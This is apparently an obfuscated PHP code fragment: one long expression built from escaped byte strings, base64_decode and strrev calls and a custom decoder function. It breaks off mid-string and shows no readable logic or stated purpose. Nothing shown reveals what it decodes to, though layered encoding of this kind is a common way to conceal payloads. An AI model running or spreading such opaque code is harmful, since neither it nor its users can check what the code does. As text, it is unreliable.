0ËÃôbÆ'."\r".'MKi3AJ‡ÁFóäm(F"…e¥').base64_decode('UKYvZ6eG1VyJoSkgfDX8wK9hAeoO6QW9BGgKRRgGX/7wUWKpNQbRMvCRR/kNoBA=')."\x68\x15\xf\xd3\xcf\xe6\x5\xf4\x77\x1e\x24\xea\xc5\x2b\x7c\x58\x33\xed\x94\x56\x48\x1b\x19\xbd\x0\x44\x65\x21\x20\x9d\x6a\x67\xdb\x4c\xb4\xb2\x4d\x28\xc9\xf0\xa5\x8d\xe2\x58\x97\x31\x2c"."\x11\x8a\x30\x5f\x61\x7d\x46\x2e\xa3\x99\x22\x5c\x44\xd9\xe5\x18\xe8\x8e\x83\xcc\x74\x97\xf2\x72\x12\x1e\x44\x4\x25\x97\x31\xd9\xc2\xfc\xa6\x94\x68\xe9\xeb\x7d\x63\x62\x1\x5a\x46\xc9\x4c"."\43\322\326\147\210\274\121\336\222\6\110\244\331\66\352\255\305\372\325\123\314\31\152\46\256\231\122\137\333\121\306\110\311\226\201\45\222\254\335\60\363\155\210\124\100\375\150".base64_decode('meg9FSIG2ULJSEPor1n5M+9Xq1Yei/6pBZqdhDZltVwupY1qsJLymVkW66TfwoQ=')."\25\101\150\60\24\111\145\125\53\333\225\231\225\42\271\330\126\220\321\106\175\305\154\21\226\71\137\331\111\7\246\343\151\351\66\354\240\264\241\344\214\264\232\223\273\110\277"."\xb3\xb6\x5d\x8c\x6b\x85\x4c\x3b\xa7\xc9\x19\x63\xa4\x40\x46\xaa\xa8\x31\xf2\xdd\xe6\x51\x32\x4a\x97\xb2\x42\xe9\x6c\xd2\x9b\x2c\x96\x31\x9f\xe3\x5f\xac\x77\x1c\x66\x71\xa0\x3d\xca\x50\x25"."\323\107\77\370\266\121\305\367\230\234\236\126\155\335\50\370\215\264\255\331\136\313\66\65\25\362\7\322\151\315\262\274\255\150\233\62\215\234\67\220\313\31\43\336\210\251\367"."\353\205\46\245\16\150\55\335\303\274\230\376\65\301\102\255\232\247\140\264\300\104\240\256\271\144\367\171\217\141\13\220\247\66\325\202\325\247\231\336\40\54\214\46\5\65\215"."\23\101\226\254\115\267\212\206\245\343\346\65\51\252\155\253\351\54\46\40\242\370\146\106\25\213\272\251\131\254\176\245\243\53\1\5\241\34\232\67\152\252\375\171\265\111\51"."\226\172\121\157\141\361\125\200\321\324\320\335\46\45\215\203\36\45\137\262\154\257\251\41\352\242\243\35\14\146\52\324\347\355\302\53\103\327\62\336\70\42\302\0\236\121\77"."\x53\x41\x93\xaf\xb0\x38\xa\xed\x4c\x24\xa2\xa9\x50\x3b\xda\x65\xbb\x83\xa9\xae\x40\xa2\x15\x76\xf8\xa0\xad\xf6\xb3\x36\x87\x11\x69\xe5\x45\x32\xe0\x72\x2f\x5a\x21\x18\x3d\xba\x51\x5f\x5".strrev('¡ZÃ°s¿pÖD€kf;ÓãÇèZ˜ŞÚ,)ãÁ§µE¨Æ½24I¬e¸ª&hŒj0')."\337\316\262\214\361\140\154\151\60\226\212\107\332\23\313\2\61\330\237\13\150\346\107\131\125\270\350\234\67\246\145\320\320\247\155\226\117\55\342\121\143\151\60\172\343\271\142"."\261\30\345\131\134\70\324\201\7\246\315\153\241\104\136\71\25\53\73\254\347\165\334\166\233\307\220\221\104\233\167\7\64\310\117\72\324\234\314\326\325\44\63\323\153\275\350"."\337\272\332\225\311\66\137\335\252\205\176\135\344\361\67\370\32\224\306\372\331\112\24\161\23\272\232\123\240\323\145\51\352\225\310\142\347\260\10\14\55\30\5\355\33\6\7"."\x6f\x47\xd2\xc2\x75\xd\x2b\x5\xc6\x82\x4b\x7a\x82\xf1\x44\xaa\x2b\x98\xe8\x8c\xb4\x41\xed\xc1\x0\x7c\x85\xd\xba\x14\x59\x6f\x57\xd2\x9f\x55\x3e\x41\x6a\x11\x3e\x84\xf2\x6a\xbf\x8b\x0"."\xe3\x50\x97\x61\x6a\x4e\x88\xd8\x10\x96\xe9\x19\x46\xa1\x71\xb0\x53\xd3\xfb\xb3\xd0\x77\x1d\x97\x96\x36\x72\x86\xa9\xe6\x30\x9d\x62\x8\xae\x31\xda\xd1\xaf\x3\xed\x0\x92\x28\x2\x71\x3d".base64_decode('X2SUy86W8r3SJ9BeC+EC2zmyBt+5EHsKu7gfEk5tbGe01x+fgf4XhDZj5FVGtgg=')."\11\322\62\224\6\121\120\235\43\246\123\123\305\126\150\233\266\201\241\246\43\111\227\146\147\15\230\44\304\205\103\223\112\274\155\254\225\31\55\247\261\321\310\152\214\150\327".strrev('§¯´»VéN%-'."\0".'w¤EûCšO6'."\0".'*÷0ËÂÄs19Cº–ìTÆb5L±ğé´2C')."\xc\x12\x87\x1a\xaf\x8a\xf4\x51\x53\xeb\xd3\x61\x41\x16\xd0\x8c\x75\xa9\xe6\x20\xcb\x80\x66\x48\x6c\x2c\x38\x20\x15\xd6\xde\x13\xe\xa7\x5a\x23\xdd\x9\xc4\x11\x53\xc8\xb2\x58\x28\x11\x64".base64_decode('OBpoSwVao3ybFDMOCTAxKaf+FDLcCB1DzfGLTQlR56JRsDQvyDxewTmXRWUE1Qc=').base64_decode('miIov4vwj3rV/Lg3jwbFyxvq3DGVhLzxhmAWBSHHw4iEGrZVRyNxyLAQQxEb1Ks=').base64_decode('mVBZtAei8hIGdQQTbNtVgfsJLIsz6ltCCU19XBV9WcgawnqQzwmWztkdrxjyRGc=')."\xa8\x7b\x71\xaa\x2b\xd2\x16\xc\xa7\x42\xdd\x88\xfc\x24\xca\xe1\x3d\xd1\xb6\x0\x9b\x43\x19\xde\x12\x61\x12\x25\x40\x7b\x10\x1\x5a\x1a\x8\x87\xdc\xc9\x83\xcb\x43\xf1\x44\xbc\x62\x14\x82"."\365\4\135\61\110\200\213\306\202\355\241\345\74\330\36\12\206\333\342\251\326\100\153\247\110\323\35\350\202\100\252\17\213\120\226\337\231\76\205\50\151\234\13\142\251\141\54".strrev('SúÃvÊVy#<½ùÏ:1(Úl‚zK(±wAŠ©ĞySêãŸe–r\\T')."\253\4\342\212\135\114\161\62\321\73\306\77\111\67\130\30\161\166\120\277\2\124\275\254\5\51\234\246\105\353\343\4\272\62\40\320\147\363\305\356\12\43\254\27\161\150\6"."\2\104\146\106\230\100\146\4\252\321\321\32\62\355\0\153\116\237\220\127\123\21\44\330\7\260\264\233\132\26\213\164\167\100\206\221\254\306\32\20\202\341\257\141\34\24\10".base64_decode('vbagVIj9UZn0IwZ9wGBDuY7+TKM/iJuDyrUCG/VeTLTZtsM++tBqYATXKPHaeg0=')."\x23\xc7\x16\x28\x62\x2\x38\xa5\xe0\x42\xf3\x80\xc5\x90\x64\x94\xd1\x98\xe9\x6c\xe7\x82\x8d\x23\x11\x59\x1c\xec\x4e\x31\xcc\xa2\x21\x9\x1b\x29\x0\x89\xa1\x91\x18\xc\x88\x6d\xc\x32\x91"."\x88\x46\xc6\x82\x71\xb6\xbc\x4d\x6d\xa8\xa4\xb3\xe1\xf2\xfb\xa6\x3\x16\x6b\x68\x6f\x82\xea\xfd\xab\x93\x23\xd3\x6b\x56\x7a\xa7\xfb\x56\xa1\x8f\xda\xba\x63\x69\x10\x42\x49\x9f\x23\x38\x5".base64_decode('8pdMnhvzRjXWwtqmpD/pr1nYtDLgHVe94/Xeud5V05O+2ukAWLW20TNzPU6AEi4=')."\x3c\x7a\x15\xfa\x69\x4e\x2e\x9c\x9a\xf4\x4e\x3b\x7e\xcd\xb1\x2b\x93\xab\xaa\x9b\xa6\x1f\x95\xf4\x1d\x9d\x1c\x59\x55\x57\xbb\x90\xd5\x93\x2e\x99\x48\xdc\x4b\x8f\xf1\xa6\x66\xa6\xd7\xa0\x26"."\41\236\211\47\51\20\132\47\45\140\21\343\172\121\100\327\316\136\317\340\150\16\265\176\221\143\245\67\71\175\325\102\51\237\4\162\327\205\170\42\104\170\263\74\135\300\173".strrev('>…'."\r".'#(Úı‘6zïéSµõY;_.{6„%ğ/ï@t'."\r".'5^‹¯Ô©Gà=×ŠÏî')."\335\4\354\54\25\364\41\246\76\50\150\103\360\141\330\14\277\173\65\173\104\143\350\201\340\216\60\102\16\46\341\241\50\51\224\43\334\37\324\200\45\41\216\243\34\231\364"."\x62\xa\xb3\x5e\x23\x3c\x94\xd1\xa\x30\x4f\x93\x20\xb5\x95\x56\x8b\x5a\x5c\xea\x61\x2a\x95\x8\xb4\x84\x83\x29\x46\x61\x80\x12\xb3\x30\xa1\x8a\x2d\x5c\xd5\x86\xba\x26\x28\x2a\xa3\xf\x69"._kodDe('LpexgQNG9CWuQ4RR+CRAJMMWvA2SOqW8NRmjtljIwTgaRuQHimQYEbg6T3COupII').strrev('Ãú$şò±–¾±­Vûz¯ˆD­Ve©ZY2MØÅ§²Š*m'."\n".'cÑbk,')."\12\372\257\24\247\206\51\264\61\373\160\73\270\46\303\21\340\321\64\150\230\234\67\52\72\270\153\333\260\325\234\243\210\4\206\60\322\304\66\156\220\375\351\154\207\5\305"."\302\133\271\244\70\44\344\264\233\353\306\270\12\103\322\134\341\34\161\315\366\361\24\36\51\62\205\302\16\145\163\163\25\43\366\5\264\234\132\245\255\216\152\140\342\143\226".base64_decode('reUd2kZLw/rk9lIuZ3MeP6cPQg2wVtZUSttumEzOrYN6q+oqJQwVCkgqlXFL7Ko=')."\x1d\x1\xc4\xbf\x24\x94\x1a\xa6\x99\x53\x42\xdd\x4a\x4b\x24\x12\xe\x6\xba\x15\xbc\x81\xc3\xc6\x83\xb8\x83\x78\x30\x1a\x40\xbb\x16\x96\x98\xe3\x89\x20\x28\xb\x43\x6d\x5e\x56\xee\x72\x6f"."\10\344\46\376\241\147\330\74\41\142\147\63\50\250\254\40\204\271\107\17\126\322\170\60\27\341\101\315\365\140\231\310\43\130\167\217\320\171\171\206\165\155\204\174\160\16\332"."\3\214\265\307\126\115\304\14\140\316\27\76\103\155\36\335\152\43\122\3\251\200\104\261\6\331\131\254\314\310\251\143\36\332\270\260\66\254\345\74\254\151\36\326\142\17\343"."\xfa\x3d\x44\x8a\x6b\x83\x66\xf5\xa0\x85\x3\xcd\x22\x9f\x88\x3e\x66\x3d\x18\x55\x30\xa6\x7a\x84\x4e\xe\xaa\x93\xc4\xc\x8f\x10\x41\x3c\xfd\xa6\x51\x2a\x46\x59\x4d\x52\x88\x36\x6\x0\xa2".base64_decode('pRwQMwzbw8RKT7nEWXnsKjedDLa7bpgoHFU+JN8yM+WD75Sc1tISQQJfzzYvRxo=').strrev('¸şÔ&•Å­Òn´°W…ÇhSĞÂØå	VhË®Ô;ˆõŠ–¾-£Â4å=l—1').base64_decode('VJ2t9rO6KsTS75iWHksLObRNkm6dIT4BZKVUwvLKE8sxl8/DPpMmsYFk6Mwn1bE=')."\12\276\175\375\101\117\10\71\213\24\5\103\100\33\213\111\152\34\155\120\355\71\25\166\240\106\71\32\210\251\307\31\302\313\307\107\210\53\71\256\210\163\245\104\70\330\236"."\x50\x16\x45\x10\x61\xd2\x8d\x14\xcd\x93\xc2\x89\x15\xf2\x8f\x51\x50\x1c\x65\xb3\xe1\x52\x9a\x49\xbc\x8\xab\x85\xc\x85\xac\x41\x54\x7b\x4d\x73\x15\xab\xa4\xca\x91\x5d\xe0\x82\xb3\x11\x1e".base64_decode('FlTKsQsPtzwIeB8i3Rc7DQNFxMZWAi5OtUCewtpm+NIYTEytjHxkft0A1i5HvTg=')."\x28\x16\xe\x43\x9\x5\x57\xe0\x91\xf8\xe\x4c\x3e\xbc\x62\x9\x48\x41\xf8\x71\x8e\xbc\xb\x31\x5d\xbb\x22\x1e\xa9\xa8\x5e\x18\xd3\xb\xb2\x46\x4a\x40\xc5\xc6\x2a\xf6\x75\xbc\x90\x5d\x3a"."\264\266\211\276\351\156\41\64\136\36\320\204\171\360\301\252\264\347\12\165\13\152\75\71\344\25\155\207\222\134\55\147\224\24\72\335\203\4\373\224\153\41\3\342\147\125\123"."\214\51\243\70\170\331\13\75\37\116\42\202\122\262\76\165\130\360\34\216\74\22\335\260\354\61\176\62\54\175\72\13\245\301\266\211\2\235\134\137\121\51\50\223\44\335\12"."\363\103\151\347\67\351\151\302\250\30\304\312\62\366\155\20\374\147\47\321\216\375\236\110\374\65\14\6\14\105\112\322\3\160\112\345\314\107\33\30\340\304\36\61\351\71\264".base64_decode('xZk+vJg68I4lbxacuFt4d5QxNK6hVQQQUVq8LE5OLXRAeCMQGwcbebEuxWyIReg=').base64_decode('QJx+0dISSpEqbxRG/srhdtPgrC7nA9yJWoksactDL23i0kA5+I0ykJTHzXm4oK4=').strrev('LúiØ0Û'."\0".'Bï\\“`ZÙµªPL–%êz÷Cç¦é3à½y3VP¦ ¢«a¼{ ')."\124\263\150\20\60\375\45\76\15\253\240\125\244\50\221\116\42\226\44\46\154\60\1\26\257\377\140\106\267\61\4\357\162\6\323\102\213\204\322\311\53\207\311\324\227\154\42"."\145\223\40\30\172\317\124\107\312\112\133\275\257\216\354\316\276\312\7\312\370\110\232\176\111\206\27\171\176\106\115\200\76\313\66\212\42\106\12\322\150\51\112\24\52\245\342".strrev('£i_¸gºaPÌ+v‡ĞÉ¦Ú„!J¾M]-Â%ä-$P1WøC=PÚM')."\241\205\7\207\205\131\5\55\12\127\354\243\53\321\247\146\62\21\166\34\44\177\227\47\225\25\175\225\13\42\66\56\274\50\51\124\71\171\40\227\23\307\340\356\360\204\131".base64_decode('6KKTM8mQCbO1E8mSHWpVgnGZQ2aonQy0MEpwM9pOWjox9zEBsRETWjmMdurWrF4=')."\320\54\276\341\232\126\45\332\361\377\230\315\55\237\3\274\126\46\102\34\34\47\51\207\261\101\332\260\143\167\345\32\120\101\232\44\6\202\154\306\51\333\301\372\304\110\31".base64_decode('0uJx4ANarLTPeHsIRdBirIyh7nQa0wETOjfKtzg5E8IozDdNVCaL5kUJJuuOLRs=')."\37\376\364\117\364\373\311\117\57\171\143\353\3\364\173\326\54\60\206\43\377\355\105\277\205\235\340\51\313\337\66\16\173\364\300\257\243\127\234\160\332\344\127\116\272\362\324"."\203\153\143\7\314\56\251\147\36\160\306\101\123\27\114\375\374\331\317\156\276\367\225\243\43\257\336\323\374\336\273\147\134\375\226\277\375\225\77\175\176\136\125\160\325\25\276".base64_decode('47a077vl2MPmHXvWHl3PfP278W0P7Hrt3Xeap0y/bb+/PfXOO+9tfcf46Q3vPP8=')."\xfe\x19\xbf\x79\xff\x80\x49\x47\x28\xcf\x3d\x3c\xf9\xc8\xb5\xf3\xe7\xfd\x61\x9a\xb6\xfc\xa9\xf0\xb9\x8f\x1e\x73\xee\x92\x49\x3b\xad\xa9\x8f\x7\x36\xbf\xf2\xf1\x11\x73\x87\xcf\x58\xb8\x25"."\366\106\166\321\127\205\352\75\156\257\75\342\211\3\373\137\54\236\176\351\224\330\243\332\371\217\377\145\217\17\347\152\3\363\156\173\74\160\307\343\67\167\315\75\47\364\126"."\xc7\xe2\xbb\x6f\x7b\x2a\xb0\xe9\xa5\x97\xf6\xbf\xfb\xfb\x8f\x2f\xbf\xfd\xf0\xdd\x9f\xbe\xf5\xbd\xc7\x56\xed\xf5\xc8\x1b\xc9\xdf\x9d\xdc\xf8\x5f\xdb\xb7\x5e\xf5\x1b\xcf\xe0\x91\xbe\xda\xdb"."\277\170\347\266\353\315\147\336\176\302\270\353\240\3\16\335\264\176\356\153\3\267\317\176\242\313\373\370\207\315\133\157\255\376\341\257\373\256\173\302\373\326\150\355\15\173\155"."\x56\xbf\x7f\xe6\xdb\xed\x6a\xeb\xdc\x86\x8b\xaa\x13\x9f\xfd\x6e\xe7\xdb\x4d\x9f\xcc\xbf\xf9\xb9\x85\x43\xfb\x9e\x12\xb8\xff\xa2\xe9\x6f\x86\x6e\xea\xdb\xfe\x5f\xfa\xd8\xbd\x85\xf3\x1f\x7b"."\xf5\x8d\xa3\x3e\xd9\x77\xf4\xbe\x2d\x8d\x3f\xfe\xc3\xfd\x7f\x99\x1d\xb0\xb6\x5e\xfd\xca\xef\x97\x1f\xf9\xec\x11\x2f\x1f\x3a\x79\xe6\xe3\x37\x5d\x34\xfb\xc5\x7f\xd\x7c\x37\xb7\x61\xed\xe1"."\257\154\212\246\36\377\240\345\251\5\267\16\135\260\271\367\200\213\206\352\147\327\35\175\343\271\323\137\370\316\201\177\113\367\135\176\306\377\74\63\267\346\27\363\215\105\227".strrev('à¾8&x™õü·i­ëpûµ9G{îxUWëà|/ŠÃÑä¹míƒù~_Ó¤ñû>')."\x95\x57\xa7\x5d\xd0\x37\x5a\xb3\x61\x8f\x69\xaf\x3c\x56\xf5\xe5\x5d\xfb\x8e\x2b\x7f\xbc\x7d\xc3\x57\xdf\x9b\xfe\xf6\xa9\xbb\xcd\x2d\xfc\x2a\xf6\xd3\xc3\xb6\xfe\xe4\x11\xef\x8f\xa6\x8f\xfc"."\342\7\177\134\177\367\151\117\234\374\214\236\332\72\365\207\237\74\133\237\231\176\303\347\331\127\32\367\273\355\205\7\237\337\175\350\341\322\242\375\112\53\376\120\167\117\141"."\277\367\117\176\167\257\327\357\354\276\364\354\143\307\176\336\175\104\313\371\37\74\146\116\377\323\103\117\225\206\237\277\325\373\260\226\135\176\312\245\157\37\176\324\332\215\227".strrev('÷URªƒø<ZÚ?ù´ãß~Ë¡†Ëuyk?ãoÂñÒr¿êÁ}ÕßY×tŞ÷.')."\x61\xf5\x93\x17\xbd\x94\xfb\xd5\xd3\x7f\xbf\xfd\xc9\xa5\xe7\x6d\xd8\xbc\xdb\xac\xfb\x57\x3f\x3e\xf9\xa7\xd7\x2c\x7b\xf3\xbe\xef\x9d\xf8\xd3\x8f\x2f\x3d\x67\xed\xf2\xfe\x4b\x52\x3b\xff\x5d"."\177\100\141\327\177\332\236\137\164\144\362\247\373\170\136\176\166\143\122\175\344\271\243\242\273\335\332\170\353\351\103\173\226\214\67\76\115\136\375\306\237\236\114\252\263\77\230"."\264\327\206\267\137\150\330\164\324\206\163\347\336\261\101\75\340\312\277\264\55\10\351\323\36\75\357\222\330\342\23\133\66\37\122\165\113\344\321\267\76\114\377\162\362\7\17"."\x8d\x5e\xf0\xc7\xfa\x52\xcf\x41\x4d\xd1\xef\x5e\x5e\xa8\xfa\x64\xf3\x73\x35\x77\x3e\xf8\xc9\xe9\x4d\x9f\xbd\xfb\xef\x4b\x4e\x3a\x32\x7a\xc9\xfe\x93\x2f\x3b\xf9\xba\xc6\xf0\x1b\xe7\x67\x76"."\xbf\xf5\xdf\x7d\x77\xbd\x74\x6d\xf6\x5d\xf3\x84\x79\xfa\xe6\x96\xb\xb7\x6d\x5c\xb3\x63\xd2\x3d\x83\x4f\x85\xce\x3c\x67\x28\xde\xfd\xc1\x1d\xe7\xcf\xb9\xfb\x91\xd3\x97\x1c\xf5\xc2\x2f\x7f"."\276\144\312\151\373\35\175\246\276\374\252\251\157\137\271\174\155\357\233\167\32\301\25\75\215\63\175\307\34\272\367\226\343\126\237\70\351\231\153\357\176\351\345\227\376\374\144".base64_decode('39udg1umvH/t7deVVm46/qFq9a6jHvvJI/fuYe8W2+U94+UTT9w0d8lDH111xrE=')."\x97\x2f\xe8\xba\xfc\xfc\xe7\xa2\xfb\xfc\xfb\xea\xf\xcf\x8b\x14\xeb\xb\xc7\x4c\x3b\xfd\x8b\x83\xf7\xdb\xe3\x89\x19\xa1\xeb\x5e\x3b\xde\x5e\xbf\x7b\x53\x5c\xb9\x3d\xff\x56\xa6\xf4\xd6\x53"."\301\216\372\327\127\124\355\161\204\377\325\206\315\115\147\177\321\276\155\321\361\177\154\71\372\202\373\147\117\255\72\345\350\57\177\167\212\157\143\357\355\163\37\120\207\333\362"."\207\37\174\365\141\277\313\157\175\326\367\353\275\327\174\164\177\353\224\315\376\227\176\267\361\375\137\137\377\132\156\151\321\332\355\362\111\363\117\374\350\202\133\36\52\76\244"."\55\171\374\207\127\255\274\244\341\317\257\375\354\57\367\137\163\322\323\245\264\266\347\263\27\255\334\255\356\303\277\136\234\335\21\155\151\173\356\236\115\327\17\57\177\373\223"."\53\207\117\127\47\317\70\345\306\167\217\177\140\123\151\360\343\343\356\170\161\317\357\267\77\66\224\230\66\370\316\247\377\331\355\355\343\264\173\356\175\40\65\70\255\141\367"."\x3f\x9c\xd5\x72\x71\xf4\x88\xf3\x9b\x67\x9e\x63\x3d\x32\xef\xb1\x7b\x4f\xb8\xe7\xe6\x2b\x27\xbf\xf5\xf3\x49\x8b\x23\xef\xbd\x77\xe8\xb5\x3\x87\x9f\xfb\xc8\x3f\x33\xb7\x74\x5e\xb1\xc8\xfb"."\247\201\277\377\374\313\253\307\156\15\45\277\367\324\135\325\377\163\132\137\361\231\223\346\354\165\327\236\113\66\74\173\337\311\373\347\257\377\360\262\45\77\330\373\220\63\167"."\154\274\347\202\373\117\130\71\147\237\351\17\377\345\341\123\256\231\267\357\310\353\47\76\172\143\335\47\243\327\57\152\376\305\123\47\174\376\305\27\7\54\274\147\335\227\277"._kodDe('LFRsxcChsO/wHcDkMfHt4XDJyjARnquY8YCh1vEZy2ww3ewRZ+euteMR4W5x8WLp')."\xde\xbd\xe5\xd5\xcf\xfe\x78\xe4\xf7\x5f\xfe\xf0\xdc\xb\x8f\x7f\xfe\xf5\xc3\xba\x2e\xbd\xe4\xa4\x83\xf6\x18\x7b\xf1\xc1\xe4\x77\x46\x93\xfb\x7e\xe7\xfc\xfd\x4f\x68\xce\x7e\x3c\x65\xfa\xae"."\267\136\70\275\365\365\217\176\162\327\263\147\357\176\322\277\207\316\53\375\360\241\256\353\157\371\172\363\6\337\335\127\34\250\275\130\333\375\361\203\365\207\375\327\246\316\153"."\276\367\360\37\102\107\37\174\165\347\5\265\253\314\342\25\147\266\137\364\152\325\362\277\315\331\372\370\33\133\327\356\273\70\362\313\367\174\3\327\154\330\166\331\51\257\377"."\371\302\123\256\171\370\157\33\307\157\72\256\361\354\67\354\357\76\73\377\225\347\333\353\276\63\65\167\353\262\33\216\133\175\374\353\65\73\57\72\350\246\203\356\76\266\361"."\205\346\251\157\217\355\152\354\72\147\306\117\352\247\355\376\327\231\357\364\376\176\367\177\256\76\362\314\375\167\55\216\76\23\71\375\342\241\153\316\277\125\235\174\376\41\332".strrev('ø?OWõü™¿|×¼şû”¼ËŞÖ%È–ğÖåZôé'."\n".'oáş{ÿGŸÕdz{¾ï[')."\x3f\xc7\xdf\x6c\xf5\xbe\xb4\xad\x75\xd1\xad\xb3\x5e\xde\x7c\xe7\xaf\x9f\xdf\xd9\xb3\xd6\x1c\xdd\xda\xf7\x79\xf2\xa6\x37\xf\xf8\x5d\xd3\xda\xe8\xe6\xe6\xeb\xf\x18\x5e\xf4\x93\xf9\xf3\x9a".strrev('wYãş»sÜÍğ¾_§¼üp¾ŸÂá¿¦¹ïê¹˜>ïGù°İŞç/¥ş¢ã|úß').strrev('ÏóyÀü}qÕ?çƒó¸×|Û±)ğó^ï#Ôö1÷ãói²ÿwÆÃ}¸Ş—'."\r".' é½,').base64_decode('rrtq9ORFLTODyZk/u/SKBz/7p/d8809f/vYPF2xP2yfN37jC13nZ/VftPfms9wM=')."\177\73\371\335\223\116\13\374\153\267\246\203\127\107\13\337\275\355\324\237\166\334\30\333\153\112\374\264\255\327\351\355\147\230\165\277\376\101\356\200\206\323\127\304\355\155\127".strrev('tºngÃnõo1øüçK‡Èÿ:¬üY_wíp|~öWS“áymŒ‹ï¤È¿ıŠàG½ÿPÎ').base64_decode('+0XrLz5sv2eT02qu//RPHwX2jh3w9xkPtu7xw3tWT1dPnXnd9h8sPuXZ//nHJco=')."\xdd\xe3\xb3\x76\x9d\xfe\xd0\xf\xb7\xfc\xf3\xd4\xf3\x8c\xfd\x36\xee\xba\x65\xfd\x97\x2b\xce\xea\xbf\xbe\xf6\xa1\x19\xbf\xfa\x5e\x60\x57\xf5\xef\x3\xbe\x19\xf5\xf\xce\x3f\xc4\xff\x58\x20"."\363\336\212\325\113\357\335\153\343\224\227\133\227\277\265\144\337\37\17\167\374\140\346\356\47\114\173\355\323\301\207\137\375\117\373\341\307\37\62\245\352\47\276\356\213\377\171"."\322\231\173\135\74\163\162\350\305\63\17\255\115\257\277\371\270\277\274\164\170\141\333\360\241\317\237\266\362\256\347\367\367\67\177\370\345\354\346\371\257\36\276\140\353\135\67".base64_decode('XLtm05HvvXPRK5MbvUs2vXh9JJmfOSd4xuX2i2fv/dQv587b87NTl/sOvmPkho8=')."\237\173\344\365\347\56\254\276\340\276\342\236\217\374\272\343\312\203\327\134\152\75\371\360\31\357\334\360\343\63\136\273\345\306\252\344\361\53\377\174\354\347\371\47\236\36\360"."\xed\xf9\x8f\x7b\xaf\xbc\x67\xe0\xd0\x5d\xab\xeb\xf6\x68\x1a\x38\x64\xca\x33\xfb\xcf\xfc\xe9\xc6\x93\x9a\xe2\x93\xe\xfe\xe7\xbe\x7\x3c\x7d\xf1\xae\x7b\x67\x7d\xb6\xb9\x63\xfa\xb\xab\xf".base64_decode('O79u0Q+/Gr31oGvqLt7jj4W5F3+QOOSu0Q/u+GhnauPXO856wn/C0CcfvNT/9ec=')."\37\377\265\372\67\253\327\175\370\305\27\237\176\375\331\47\333\373\373\237\176\140\277\353\77\333\376\373\37\375\350\353\57\246\175\366\365\223\107\372\127\77\160\367\147\357\134"."\365\373\324\227\237\274\363\374\271\376\373\277\172\173\373\3\13\276\176\377\201\7\316\53\35\361\347\317\367\276\362\67\157\366\146\266\6\253\167\176\160\105\346\265\273\107\336"."\x5e\x35\xf7\xd3\xf7\xf6\xfe\xc7\x47\x4f\x2e\xba\x6d\xe9\xdf\xff\xbb\xf0\xce\x3b\xb3\x3f\xfd\x64\xe5\xbb\xdd\x77\xbc\xb4\xf0\x98\xf9\xe3\xff\xfa\xd7\x81\x87\xee\xda\x6b\xf6\x69\x47\xbf\x3d".strrev('.£ãÿ±9ïèğ\'ñz¾Ô×½ıëZöŸıÿ[úòŸ§Íÿ.šg_Cä÷vÎ')."\72\147\126\174\217\263\372\72\76\330\363\262\375\74\207\34\266\266\351\362\33\66\234\272\361\316\226\303\216\371\361\327\7\334\371\110\325\21\275\7\263\313\13\63\147\203\271".base64_decode('y5hpq5o+QANgyzz3GGCBjpkxF5gikAv7evNGCbQmI8Q2D+TiufVzGQ8+MtQ/WGQ=')."\xbc\x14\xc4\xce\x81\x92\x67\xce\x2\x23\x97\xd9\x8c\xcb\x1a\xee\xef\xcb\x18\xe3\xa0\x64\x9b\x31\x73\xe\xfd\x18\x2c\x8c\xe4\xfa\xd8\x19\x10\x64\x51\xb5\xe1\x91\xa1\x34\xd4\x37\x6b\xe\xe4".base64_decode('L42nTWsUuNHh0bGhgREmpYz2jWUZAzt3JqSfCRZYjXOhbY0zoG364LjZPwDnqLM=')."\131\113\264\114\177\241\150\301\211\257\66\234\66\372\106\240\163\240\43\236\63\27\76\264\361\342\320\10\63\4\152\250\207\342\147\260\217\206\71\60\102\163\352\147\303\350\262"."\141\126\207\372\315\301\161\70\227\34\56\366\216\147\354\22\113\62\233\215\27\344\36\30\35\32\324\372\140\144\346\66\100\53\207\207\112\150\304\100\332\35\31\260\306\207\173"."\101\304\231\61\27\62\366\215\25\107\307\113\240\323\33\323\7\7\106\230\65\372\254\106\70\126\156\150\150\144\363\6\243\324\300\20\40\75\250\215\145\114\310\75\173\16\144"."\230\301\132\245\145\113\346\100\377\30\353\73\264\152\66\313\155\27\206\214\121\15\72\70\153\6\33\232\143\130\47\241\66\275\337\34\317\147\140\254\347\60\14\71\246\1\322"."\x19\x83\x63\xf9\x74\x16\x50\xc5\x1e\xd5\xc6\x6\xb3\x30\xe\xda\x40\x21\x97\x1e\x5\x43\xc3\xd9\x8d\x30\xa1\xb3\xe7\xb2\xf1\xd5\x87\xf3\xd6\x0\xb4\x6e\xe\xc3\x9c\x19\xac\xdc\x59\x30\xc6"."\x8d\xb3\xe6\xb0\xee\xc3\x38\xe8\x43\x83\x6a\x36\x7\x95\x64\xc6\x72\x7a\x7a\x4\xe4\xe4\x42\x3e\xd3\xab\x33\x75\xcb\x60\x51\xcb\x67\x6\x40\xd7\x3a\x68\x8c\x8c\xe6\x55\x68\xe5\xdc\x46\x36".strrev('ÒŞÙÓäŒÁªkÏ9°æ+Ys¿'."\n".'xgmg¬ì1õÎÚ`æ2»«ÌÍtì™}C')."\160\141\34\52\33\37\34\31\353\145\22\376\120\251\157\120\7\264\116\333\105\63\313\54\55\325\321\214\221\325\40\246\317\30\32\310\365\302\152\101\210\142\147\7\231\235\271"."\x36\x30\x94\xee\x63\xe8\xc4\x6\x77\x60\xb8\x77\x44\xd3\xa1\xc2\x99\xd\x73\xd9\x98\xc2\x87\x91\x19\x1f\xcd\x17\xa1\xec\xa2\x36\x9a\x1b\x60\x64\x63\x36\x14\x30\xa8\x6b\x23\xf9\x22\x60\x14"."\103\322\331\163\141\261\353\343\231\374\20\123\4\316\234\3\203\220\56\216\145\162\32\233\364\254\132\354\147\146\76\163\146\102\11\205\201\41\113\317\262\113\63\175\146\141\234"."\x99\x6b\xc\xa5\x47\xfa\xf5\x5e\x18\xf5\xe1\x5e\x7b\x6c\x30\xcd\xae\x73\xa8\x83\x86\xdd\xf\xe8\xb3\x22\xf\xfd\x6e\x51\xd3\x83\xac\x5\x48\xbc\xb4\x59\x7\x78\x2\x7e\x85\xa3\xe0\x43\x13".strrev('¦s—8¦HV+Òéš§B÷	ÍX‰VFy³*m˜ÓP`œ°²ÓÏ:6mÎ')."\13\266\24\215\102\216\330\270\155\230\334\170\201\232\105\371\160\253\174\316\176\326\303\144\124\70\67\3\35\245\145\215\30\146\206\41\176\46\235\63\112\31\107\251\231\136\107".strrev('Î\\ŠÔêÇ+Ø2}µ[]Ê¤Ù¥{ˆl|%,fKÔÁ“äÃTpßLwv„Ê